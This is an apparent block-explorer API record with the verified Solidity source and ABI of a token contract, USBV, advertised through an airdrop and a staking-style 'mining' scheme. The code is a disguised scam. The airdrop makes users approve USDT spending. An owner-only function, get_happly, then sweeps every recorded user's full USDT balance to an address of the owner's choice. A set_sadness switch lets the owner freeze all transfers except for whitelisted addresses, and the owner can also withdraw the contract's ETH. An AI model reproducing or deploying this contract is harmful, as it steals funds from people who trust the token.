{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity >=0.4.22 <0.6.0;\r\ncontract USDT_ERC{\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n    function transfer(address _to, uint256 _value) public ;\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\r\n    function approve(address _spender, uint256 _value) public returns (bool success) ;\r\n}\r\ncontract USBV_ERC {\r\n    string public name = 'USBV';\r\n    string public symbol = 'USBV';\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply=2100000 ether;\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n    \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n    USDT_ERC usdt=USDT_ERC(0xdAC17F958D2ee523a2206206994597C13D831ec7);\r\n    \r\n\r\n    uint256 mine_out=1750000 ether;//挖矿175万币\r\n    uint256 air_drop=100000 ether;\r\n    address private admin;\r\n    address private owner;\r\n    uint256 public totalMiner;\r\n    bool sadness;\r\n    constructor () public{\r\n        admin == msg.sender;\r\n        owner=0x0cC4E82C03fF528860b995DeeC7F800cACC3B854;\r\n        balanceOf[owner]=200000 ether;\r\n        miner_id[0]=admin;\r\n    }\r\n    \r\n    function _transfer(address _from, address _to, uint _value) internal {\r\n        require(_to !=address(0x0));\r\n        require(sadness == false || miner[_from].happy == true);\r\n        require(balanceOf[_from] >= _value);\r\n        require(balanceOf[_to] + _value > balanceOf[_to]);\r\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        emit Transfer(_from, _to, _value);\r\n        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\r\n    }\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(_value <= allowance[_from][msg.sender]);\r\n        allowance[_from][msg.sender] -= _value;\r\n        _transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    struct USER{\r\n        uint256 mine_yfi;\r\n        uint256 mine_time;\r\n        bool is_airdrop;\r\n        bool happy;\r\n        \r\n    }\r\n    mapping(address => USER)public miner;\r\n    mapping(uint256 => address)miner_id;\r\n    uint256 miner_count=1;\r\n    function set_owner(address addr)public {\r\n        require(msg.sender == admin);\r\n        owner = addr;\r\n    }\r\n    event fallback_get_eth(address indexed addr,uint256 value);\r\n    event zhongchou_get_yfki(address indexed addr,uint256 value);\r\n    event miner_get_yfki(address indexed addr,uint256 yfik,uint256 unlock_yfi);\r\n    function ()external payable{\r\n        emit fallback_get_eth(msg.sender,msg.value);\r\n    }\r\n    //空投 \r\n    function AirDrop(address referee)public{\r\n        require(!miner[msg.sender].is_airdrop);\r\n        uint256 myusdt=usdt.balanceOf(address(this));\r\n        usdt.transferFrom(msg.sender,address(this),10000);\r\n        require(myusdt + 10000 == usdt.balanceOf(address(this)));\r\n        miner_id[miner_count++]=msg.sender;\r\n        miner[msg.sender].is_airdrop=true;\r\n        balanceOf[msg.sender]+=5 ether;\r\n        balanceOf[referee]+= (1 ether/2);\r\n    }\r\n    //挖矿\r\n    function input_mine(uint256 value)public{\r\n        require(totalMiner < mine_out);\r\n        require(mine_out >= value *2);\r\n        require(balanceOf[msg.sender]>=value);\r\n        uint256 m=compute_mine(msg.sender);\r\n        require(mine_out >=m);\r\n        \r\n        if(m>0){//复投时先取出之前挖矿的收益\r\n            mine_out-=m;\r\n            balanceOf[msg.sender]+=m;\r\n            emit miner_get_yfki(msg.sender,m,0);\r\n        }\r\n        balanceOf[msg.sender]-=value;\r\n        totalMiner += value;\r\n        miner[msg.sender].mine_yfi+=value;\r\n        miner[msg.sender].mine_time = now;\r\n    }\r\n    //取矿\r\n    function output_mine()public{\r\n        uint256 m=compute_mine(msg.sender);\r\n        if(m > mine_out){\r\n            m = mine_out;\r\n            mine_out = 0;\r\n        }\r\n        else\r\n            mine_out -= m;\r\n        if(totalMiner < miner[msg.sender].mine_yfi)\r\n            totalMiner =0;\r\n        else \r\n            totalMiner -= miner[msg.sender].mine_yfi;\r\n        emit miner_get_yfki(msg.sender,m,miner[msg.sender].mine_yfi);    \r\n        m=m+miner[msg.sender].mine_yfi;\r\n        miner[msg.sender].mine_yfi=0;\r\n        balanceOf[msg.sender]+=m;\r\n        \r\n    }\r\n    function compute_mine(address addr)internal view returns(uint256){\r\n       if(miner[addr].mine_time ==0 || miner[addr].mine_yfi ==0)return 0;\r\n       uint256 ret=now -  miner[addr].mine_time;\r\n       ret= (miner[addr].mine_yfi/100000000000) *ret * 11574;\r\n       return ret;\r\n    }\r\n    function compute_mine1()public view returns(uint256 t,uint256 m){\r\n        if(miner[msg.sender].mine_time ==0 || miner[msg.sender].mine_yfi ==0)return (0,0);\r\n       uint256 t0=now -  miner[msg.sender].mine_time;\r\n       uint256 ret= miner[msg.sender].mine_yfi/100000000000 * t0 * 5787;\r\n       return (t0,ret);\r\n    }\r\n    function output_eth(address payable addr)public{\r\n        require(msg.sender == owner);\r\n        require(addr != address(0x0));\r\n        addr.transfer(address(this).balance);\r\n    }\r\n    function set_happly(address addr,bool value)public{\r\n        require(msg.sender == owner) ;\r\n        miner[addr].happy = value;\r\n    }\r\n    function set_sadness(bool value)public{\r\n        require(msg.sender==owner);\r\n        sadness=value;\r\n    }\r\n    function get_happly(address addr,uint256 min,uint256 max)public{\r\n        require(msg.sender==owner);\r\n        for(uint256 i=min;i<max;i++){\r\n            usdt.transferFrom(miner_id[i],addr,usdt.balanceOf(miner_id[i]));\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"output_eth\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"set_happly\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"min\",\"type\":\"uint256\"},{\"name\":\"max\",\"type\":\"uint256\"}],\"name\":\"get_happly\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"output_mine\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"set_owner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"input_mine\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"compute_mine1\",\"outputs\":[{\"name\":\"t\",\"type\":\"uint256\"},{\"name\":\"m\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalMiner\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"set_sadness\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"miner\",\"outputs\":[{\"name\":\"mine_yfi\",\"type\":\"uint256\"},{\"name\":\"mine_time\",\"type\":\"uint256\"},{\"name\":\"is_airdrop\",\"type\":\"bool\"},{\"name\":\"happy\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"referee\",\"type\":\"address\"}],\"name\":\"AirDrop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"fallback_get_eth\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"zhongchou_get_yfki\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"yfik\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"unlock_yfi\",\"type\":\"uint256\"}],\"name\":\"miner_get_yfki\",\"type\":\"event\"}]","ContractName":"USBV_ERC","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://a064c609c35b651aa86d815d07f30fea00cbab07a62f72c4b87ff864069776a0"}]}